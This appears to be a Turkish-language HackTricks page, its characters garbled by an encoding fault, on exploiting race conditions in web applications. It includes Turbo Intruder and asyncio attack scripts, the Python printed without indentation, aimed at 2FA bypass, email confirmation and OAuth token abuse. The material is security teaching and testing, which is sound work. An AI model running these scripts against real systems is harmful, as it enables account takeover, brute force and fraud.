# YarÄ±ÅŸ KoÅŸulu

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturabilir ve otomatikleÅŸtirebilirsiniz.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklam vermek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>

{% hint style="warning" %}
Bu teknik hakkÄ±nda derin bir anlayÄ±ÅŸ elde etmek iÃ§in orijinal raporu [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine) adresinden kontrol edin.
{% endhint %}

## YarÄ±ÅŸ KoÅŸulu SaldÄ±rÄ±larÄ±nÄ± GeliÅŸtirme

YarÄ±ÅŸ koÅŸullarÄ±ndan faydalanmanÄ±n temel engeli, birden fazla isteÄŸin aynÄ± anda, **Ã§ok az farkla iÅŸlenmesini saÄŸlamaktÄ±r - ideal olarak, 1 ms'den az**.

Burada Ä°stekleri Senkronize Etme Tekniklerini bulabilirsiniz:

#### HTTP/2 Tek Paket SaldÄ±rÄ±sÄ± vs. HTTP/1.1 Son-Byte Senkronizasyonu

- **HTTP/2**: Bir TCP baÄŸlantÄ±sÄ± Ã¼zerinden iki istek gÃ¶ndermeyi destekler, aÄŸ dalgalanmasÄ± etkisini azaltÄ±r. Ancak, sunucu tarafÄ±ndaki deÄŸiÅŸkenler nedeniyle, iki istek tutarlÄ± bir yarÄ±ÅŸ koÅŸulu saldÄ±rÄ±sÄ± iÃ§in yeterli olmayabilir.
- **HTTP/1.1 'Son-Byte Senkronizasyonu'**: 20-30 isteÄŸin Ã§oÄŸu kÄ±smÄ±nÄ± Ã¶nceden gÃ¶ndermeyi saÄŸlar, kÃ¼Ã§Ã¼k bir parÃ§ayÄ± tutarak birlikte gÃ¶nderilmesini saÄŸlar ve sunucuya aynÄ± anda ulaÅŸmayÄ± baÅŸarÄ±r.

**Son-Byte Senkronizasyonu iÃ§in HazÄ±rlÄ±k** aÅŸaÄŸÄ±dakileri iÃ§erir:
1. BaÅŸlÄ±k ve gÃ¶vde verilerini, akÄ±ÅŸÄ± sonlandÄ±rmadan son bayt hariÃ§ gÃ¶nderme.
2. Ä°lk gÃ¶nderimden sonra 100 ms beklemek.
3. Son Ã§erÃ§eveleri toplu iÅŸlem yapmak iÃ§in TCP_NODELAY'i devre dÄ±ÅŸÄ± bÄ±rakmak.
4. BaÄŸlantÄ±yÄ± Ä±sÄ±tmak iÃ§in ping gÃ¶ndermek.

Tutulan Ã§erÃ§evelerin sonraki gÃ¶nderimi, Wireshark Ã¼zerinden tek bir pakette ulaÅŸmalarÄ±nÄ± saÄŸlamalÄ±dÄ±r. Bu yÃ¶ntem, genellikle RC saldÄ±rÄ±larÄ±yla iliÅŸkili olmayan statik dosyalara uygulanmaz.

### Sunucu Mimarisiyle Uyum SaÄŸlama

Hedefin mimarisini anlamak Ã¶nemlidir. Ã–n uÃ§ sunucularÄ± istekleri farklÄ± yÃ¶nlendirebilir ve zamanlamayÄ± etkileyebilir. Ã–nemsiz istekler aracÄ±lÄ±ÄŸÄ±yla Ã¶nceden sunucu tarafÄ± baÄŸlantÄ± Ä±sÄ±tma, istek zamanlamasÄ±nÄ± normalize edebilir.

#### Oturum TabanlÄ± Kilitlenmeyi AÅŸma

PHP'nin oturum iÅŸleyicisi, oturum baÅŸÄ±na istekleri seri hale getirerek zafiyetleri gizleyebilir. Her istek iÃ§in farklÄ± oturum belirteÃ§leri kullanmak, bu sorunu aÅŸmanÄ±za yardÄ±mcÄ± olabilir.

#### HÄ±z veya Kaynak SÄ±nÄ±rlarÄ±nÄ± AÅŸma

BaÄŸlantÄ± Ä±sÄ±tma etkisiz ise, web sunucularÄ±nÄ±n hÄ±z veya kaynak sÄ±nÄ±rlarÄ±nÄ± kasÄ±tlÄ± olarak tetiklemek iÃ§in sahte isteklerin bir seli, yarÄ±ÅŸ koÅŸullarÄ±na uygun bir sunucu tarafÄ± gecikmeyi kolaylaÅŸtÄ±rabilir.


## SaldÄ±rÄ± Ã–rnekleri

* **Tubo Intruder - HTTP2 tek paket saldÄ±rÄ±sÄ± (1 uÃ§ nokta)**: Ä°steÄŸi **Turbo intruder**'a gÃ¶nderebilirsiniz (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), istekte **`%s`** gibi brute force yapmak istediÄŸiniz deÄŸeri **`csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`** ÅŸeklinde deÄŸiÅŸtirebilir ve ardÄ±ndan aÃ§Ä±lÄ±r menÃ¼den **`examples/race-single-packer-attack.py`**'yi seÃ§ebilirsiniz:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

FarklÄ± deÄŸerler gÃ¶nderecekseniz, panodan bir kelime listesi kullanan aÅŸaÄŸÄ±daki kodu deÄŸiÅŸtirebilirsiniz:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
EÄŸer web HTTP2'yi desteklemiyorsa (sadece HTTP1.1), `Engine.BURP2` yerine `Engine.THREADED` veya `Engine.BURP` kullanÄ±n.
{% endhint %}

* **Tubo Intruder - HTTP2 tek paket saldÄ±rÄ±sÄ± (Ã‡eÅŸitli uÃ§ noktalar)**: RCE'yi tetiklemek iÃ§in 1 uÃ§ noktaya istek gÃ¶ndermeniz ve ardÄ±ndan diÄŸer uÃ§ noktalara birden fazla istek gÃ¶ndermeniz gerekiyorsa, `race-single-packet-attack.py` betiÄŸini aÅŸaÄŸÄ±daki gibi deÄŸiÅŸtirebilirsiniz:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* AyrÄ±ca, Burp Suite'deki yeni '**Paralel olarak grup gÃ¶nder**' seÃ§eneÄŸiyle **Repeater** Ã¼zerinde de mevcuttur.
* **Limit aÅŸÄ±mÄ±** iÃ§in, grup iÃ§ine **aynÄ± isteÄŸi 50 kez** ekleyebilirsiniz.
* **BaÄŸlantÄ± Ä±sÄ±nmasÄ±** iÃ§in, web sunucusunun statik olmayan bir bÃ¶lÃ¼mÃ¼ne bazÄ± istekler ekleyebilirsiniz. Bu istekleri grup baÅŸÄ±na ekleyin.
* Ä°ki alt durum adÄ±mÄ± arasÄ±nda iÅŸlem yapma sÃ¼recini **geciktirmek** iÃ§in, her iki istek arasÄ±na **ekstra istekler ekleyebilirsiniz**.
* **Ã‡oklu uÃ§ nokta** RC iÃ§in, **gizli duruma giden isteÄŸi** gÃ¶ndermeye baÅŸlayabilir ve ardÄ±ndan **gizli durumu** sÃ¶mÃ¼ren **50 istek** gÃ¶nderebilirsiniz.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Ham BF

Ã–nceki araÅŸtÄ±rmadan Ã¶nce, bir RC'ye neden olmak iÃ§in paketleri mÃ¼mkÃ¼n olduÄŸunca hÄ±zlÄ± bir ÅŸekilde gÃ¶ndermeye Ã§alÄ±ÅŸan bazÄ± payloadlar kullanÄ±lmÄ±ÅŸtÄ±r.

* **Repeater:** Ã–nceki bÃ¶lÃ¼mdeki Ã¶rnekleri kontrol edin.
* **Intruder**: **Ä°steÄŸi Intruder'a** gÃ¶nderin, **SeÃ§enekler** menÃ¼sÃ¼nde **iÅŸ parÃ§acÄ±ÄŸÄ± sayÄ±sÄ±nÄ± 30** olarak ayarlayÄ±n ve payload olarak **BoÅŸ payloadlar** seÃ§in ve **30** oluÅŸturun.
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**

Python'da `asyncio` modÃ¼lÃ¼, asenkron programlama iÃ§in kullanÄ±lan bir kÃ¼tÃ¼phanedir. Bu modÃ¼l, bir dizi asenkron iÅŸlemi yÃ¶netmek iÃ§in kullanÄ±lan bir event loop (etkinlik dÃ¶ngÃ¼sÃ¼) saÄŸlar. `asyncio` kullanarak, aynÄ± anda birden fazla iÅŸlemi eÅŸzamanlÄ± olarak Ã§alÄ±ÅŸtÄ±rabilir ve bÃ¶ylece performansÄ± artÄ±rabilirsiniz.

`asyncio` modÃ¼lÃ¼, `async` ve `await` anahtar kelimelerini kullanarak asenkron iÅŸlemleri tanÄ±mlamanÄ±za olanak tanÄ±r. `async` anahtar kelimesi, bir fonksiyonun asenkron olarak Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± belirtirken, `await` anahtar kelimesi, bir iÅŸlemin tamamlanmasÄ±nÄ± beklemek iÃ§in kullanÄ±lÄ±r.

AÅŸaÄŸÄ±da, `asyncio` kullanarak basit bir Ã¶rnek verilmiÅŸtir:

```python
import asyncio

async def my_coroutine():
    print("BaÅŸlangÄ±Ã§")

    await asyncio.sleep(1)
    print("1 saniye bekledikten sonra")

    await asyncio.sleep(2)
    print("2 saniye bekledikten sonra")

    print("Son")

asyncio.run(my_coroutine())
```

Bu Ã¶rnekte, `my_coroutine` adlÄ± bir asenkron fonksiyon tanÄ±mlanmÄ±ÅŸtÄ±r. Bu fonksiyon, `await asyncio.sleep()` kullanarak belirli bir sÃ¼re beklemektedir. `asyncio.run()` fonksiyonu ise asenkron fonksiyonu Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±lmaktadÄ±r.

Bu ÅŸekilde, `asyncio` kullanarak asenkron programlama yapabilir ve iÅŸlemleri daha verimli bir ÅŸekilde yÃ¶netebilirsiniz.
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Metodolojisi**

### SÄ±nÄ±rlama AÅŸÄ±mÄ± / TOCTOU

Bu, bir eylemi belirli bir sayÄ±da gerÃ§ekleÅŸtirebileceÄŸiniz yerlerde ortaya Ã§Ä±kan **zayÄ±flÄ±klarÄ±n** en temel tÃ¼rÃ¼dÃ¼r. Ã–rneÄŸin, aynÄ± indirim kodunu bir web maÄŸazasÄ±nda birden fazla kez kullanmak gibi. Ã‡ok basit bir Ã¶rnek [**bu raporda**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) veya [**bu hatada**](https://hackerone.com/reports/759247)** bulunabilir**.

Bu tÃ¼r saldÄ±rÄ±nÄ±n birÃ§ok varyasyonu vardÄ±r, bunlar arasÄ±nda:

* Bir hediye kartÄ±nÄ± birden fazla kez kullanmak
* Bir Ã¼rÃ¼ne birden fazla kez puan vermek
* Hesap bakiyenizden fazla para Ã§ekmek veya transfer etmek
* Tek bir CAPTCHA Ã§Ã¶zÃ¼mÃ¼nÃ¼ tekrar kullanmak
* Bir anti-brute-force hÄ±z sÄ±nÄ±rlamasÄ±nÄ± aÅŸmak

### **Gizli alt durumlar**

KarmaÅŸÄ±k yarÄ±ÅŸ koÅŸullarÄ±nÄ± sÃ¶mÃ¼rmek genellikle gizli veya **istenmeyen makine alt durumlarÄ±yla** etkileÅŸim fÄ±rsatlarÄ±ndan yararlanmayÄ± iÃ§erir. Ä°ÅŸte bunu nasÄ±l ele alacaÄŸÄ±nÄ±z:

1. **Potansiyel Gizli Alt DurumlarÄ± Belirleme**
- KullanÄ±cÄ± profilleri veya ÅŸifre sÄ±fÄ±rlama sÃ¼reÃ§leri gibi Ã¶nemli verileri deÄŸiÅŸtiren veya etkileÅŸime giren uÃ§ noktalarÄ± belirleyerek baÅŸlayÄ±n. OdaklanmanÄ±z gereken noktalar:
- **Depolama**: Sunucu tarafÄ±nda kalÄ±cÄ± verileri iÅŸleyen uÃ§ noktalarÄ±, istemci tarafÄ±nda veri iÅŸleyenlere tercih edin.
- **Eylem**: Var olan verileri deÄŸiÅŸtiren iÅŸlemleri arayÄ±n, bunlar yeni veri eklemekten daha fazla sÃ¶mÃ¼rÃ¼lebilir koÅŸullar yaratma eÄŸilimindedir.
- **Anahtarlama**: BaÅŸarÄ±lÄ± saldÄ±rÄ±lar genellikle aynÄ± tanÄ±mlayÄ±cÄ±ya (kullanÄ±cÄ± adÄ± veya sÄ±fÄ±rlama belirteci gibi) dayalÄ± iÅŸlemleri iÃ§erir.

2. **Ä°lk AraÅŸtÄ±rmayÄ± Yapma**
- Belirlenen uÃ§ noktalarÄ± yarÄ±ÅŸ koÅŸulu saldÄ±rÄ±larÄ±yla test ederek beklenen sonuÃ§lardan herhangi bir sapma olup olmadÄ±ÄŸÄ±nÄ± gÃ¶zlemleyin. Beklenmeyen yanÄ±tlar veya uygulama davranÄ±ÅŸÄ±ndaki deÄŸiÅŸiklikler bir zayÄ±flÄ±k iÅŸareti olabilir.

3. **ZayÄ±flÄ±ÄŸÄ± GÃ¶sterme**
- SaldÄ±rÄ±yÄ±, genellikle sadece iki istek gerektiren minimum sayÄ±ya daraltÄ±n. Bu adÄ±m, hassas zamanlama nedeniyle birden fazla deneme veya otomasyon gerektirebilir.

### Zaman Hassas SaldÄ±rÄ±lar

Ä°steklerin zamanlamasÄ±nda hassasiyet, Ã¶zellikle gÃ¼venlik belirteÃ§leri iÃ§in zaman damgalarÄ± gibi tahmin edilebilir yÃ¶ntemler kullanÄ±ldÄ±ÄŸÄ±nda zayÄ±flÄ±klarÄ± ortaya Ã§Ä±karabilir. Ã–rneÄŸin, zaman damgalarÄ±na dayalÄ± ÅŸifre sÄ±fÄ±rlama belirteÃ§leri, eÅŸzamanlÄ± istekler iÃ§in aynÄ± belirteÃ§lere izin verebilir.

**SÃ¶mÃ¼rmek iÃ§in:**
- EÅŸzamanlÄ± ÅŸifre sÄ±fÄ±rlama istekleri yapmak iÃ§in tek paket saldÄ±rÄ±sÄ± gibi hassas zamanlama kullanÄ±n. EÅŸleÅŸen belirteÃ§ler, bir zayÄ±flÄ±k olduÄŸunu gÃ¶sterir.

**Ã–rnek:**
- AynÄ± anda iki ÅŸifre sÄ±fÄ±rlama belirteci isteyin ve karÅŸÄ±laÅŸtÄ±rÄ±n. EÅŸleÅŸen belirteÃ§ler, belirteÃ§ oluÅŸturma iÅŸleminde bir hata olduÄŸunu gÃ¶sterir.

**Bunu denemek iÃ§in bu [PortSwigger Lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)'e bakÄ±n.**


## Gizli alt durumlar Ã¶rnekleri

### Ã–deme yap ve bir Ã¶ÄŸe ekle

Bu [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)'a bakarak bir maÄŸazada **Ã¶deme yapÄ±n** ve **Ã¶demek zorunda kalmadan** ekstra bir Ã¶ÄŸe ekleyin.

### DiÄŸer e-postalarÄ± onayla

Fikir, bir e-posta adresini doÄŸrulamak ve aynÄ± anda farklÄ± bir adrese deÄŸiÅŸtirmektir, bÃ¶ylece platformun yeni adresi doÄŸrulayÄ±p doÄŸrulamadÄ±ÄŸÄ±nÄ± Ã¶ÄŸrenebilirsiniz.

### 2 e-posta adresine dayalÄ± e-posta deÄŸiÅŸtirme

[**Bu araÅŸtÄ±rmaya**](https://portswigger.net/research/smashing-the-state-machine) gÃ¶re Gitlab, bu ÅŸekilde bir ele geÃ§irmeye karÅŸÄ± savunmasÄ±zdÄ± Ã§Ã¼nkÃ¼ bir e-postanÄ±n e-posta doÄŸrulama belirteci baÅŸka bir e-postaya **gÃ¶nderilebilirdi**.

**Bunu denemek iÃ§in bu [PortSwigger Lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)'e bakÄ±n.**

### Gizli VeritabanÄ± durumlarÄ± / OnayÄ± GeÃ§me

EÄŸer bir veritabanÄ±na **2 farklÄ± yazma** kullanÄ±lÄ±yorsa, veritabanÄ±na sadece ilk verinin yazÄ±ldÄ±ÄŸÄ± kÃ¼Ã§Ã¼k bir zaman dilimi vardÄ±r. Ã–rneÄŸin, bir kullanÄ±cÄ± oluÅŸturulurken **kullanÄ±cÄ± adÄ±** ve **ÅŸifre** yazÄ±labilir ve ardÄ±ndan yeni oluÅŸturulan hesabÄ± onaylamak iÃ§in **belirteÃ§** yazÄ±lÄ±r. Bu, bir sÃ¼re iÃ§in **bir hesabÄ± onaylamak iÃ§in belirtecin boÅŸ olduÄŸu** anlamÄ±na gelir.

Bu nedenle, bir hesap kaydetmek ve hemen hesabÄ± onaylamak iÃ§in boÅŸ bir belirteÃ§le (`token=` veya `token[]=` veya baÅŸka bir varyasyon) birkaÃ§ istek gÃ¶ndermek, kontrolÃ¼nÃ¼z altÄ±nda olmayan bir e-postayÄ± onaylamaya izin verebilir.

**Bunu denemek iÃ§in bu [PortSwigger Lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)'e bakÄ±n.**

### 2FA'yÄ± GeÃ§me

AÅŸaÄŸÄ±daki sÃ¶zdizimi kodu, oturum oluÅŸturulurken Ã§ok kÄ±sa bir sÃ¼re boyunca **2FA'nÄ±n uygulanmadÄ±ÄŸÄ±** iÃ§in yarÄ±ÅŸ koÅŸuluna karÅŸÄ± savunmasÄ±zdÄ±r:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 sonsuz kalÄ±cÄ±lÄ±k

BirkaÃ§ [**OAuth saÄŸlayÄ±cÄ±**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers) bulunmaktadÄ±r. Bu hizmetler, saÄŸlayÄ±cÄ±nÄ±n kaydettiÄŸi kullanÄ±cÄ±larÄ± doÄŸrulamanÄ±za ve bir uygulama oluÅŸturmanÄ±za izin verir. Bunun iÃ§in **istemci**, **uygulamanÄ±za** OAuth saÄŸlayÄ±cÄ±sÄ± iÃ§indeki bazÄ± verilere eriÅŸim izni vermelidir.\
Yani, buraya kadar sadece google/linkedin/github... ile yapÄ±lan ortak bir giriÅŸ iÅŸlemi, size "_Uygulama \<InsertCoolName>, bilgilerinize eriÅŸmek istiyor, izin vermek istiyor musunuz?_" ÅŸeklinde bir sayfa ile karÅŸÄ±laÅŸÄ±rsÄ±nÄ±z.

#### `authorization_code` iÃ§indeki YarÄ±ÅŸ KoÅŸulu

**Sorun**, bunu **kabul ettiÄŸinizde** ve otomatik olarak **zararlÄ± uygulamaya bir `authorization_code`** gÃ¶nderildiÄŸinde ortaya Ã§Ä±kar. ArdÄ±ndan, bu uygulama, **`authorization_code`** iÃ§inden hesabÄ±nÄ±z iÃ§in birden fazla AT/RT (_Kimlik DoÄŸrulama Jetonu/Yenileme Jetonu_) oluÅŸturmak iÃ§in OAuth hizmet saÄŸlayÄ±cÄ±sÄ±nda bir YarÄ±ÅŸ KoÅŸulunu kÃ¶tÃ¼ye kullanÄ±r. Temel olarak, uygulamanÄ±n verilerinize eriÅŸim izni vermenizi kabul ettiÄŸiniz gerÃ§eÄŸini kÃ¶tÃ¼ye kullanacak ve **birkaÃ§ hesap oluÅŸturacaktÄ±r**. ArdÄ±ndan, eÄŸer **uygulamanÄ±n verilerinize eriÅŸim iznini durdurursanÄ±z, bir Ã§ift AT/RT silinecek, ancak diÄŸerleri hala geÃ§erli olacaktÄ±r**.

#### `Refresh Token` iÃ§indeki YarÄ±ÅŸ KoÅŸulu

GeÃ§erli bir RT'yi **edinmiÅŸseniz**, onu kÃ¶tÃ¼ye kullanarak birÃ§ok AT/RT oluÅŸturmayÄ± deneyebilirsiniz ve hatta kullanÄ±cÄ±, zararlÄ± uygulamanÄ±n verilerine eriÅŸim iznini **iptal etse bile birkaÃ§ RT hala geÃ§erli olacaktÄ±r**.

## **WebSockets'te YarÄ±ÅŸ KoÅŸulu**

[**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) adresinde, **Web Sockets'te de YarÄ±ÅŸ KoÅŸullarÄ±nÄ±** kÃ¶tÃ¼ye kullanmak iÃ§in **paralel** olarak websocket mesajlarÄ± gÃ¶ndermek iÃ§in bir Java PoC bulabilirsiniz.

## Referanslar

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana dÃ¶nÃ¼ÅŸmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **tanÄ±tmak veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da takip edin ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live).
* Hacking hilelerinizi paylaÅŸarak HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek katkÄ±da bulunun.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
DÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturup otomatikleÅŸtirmek** iÃ§in [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
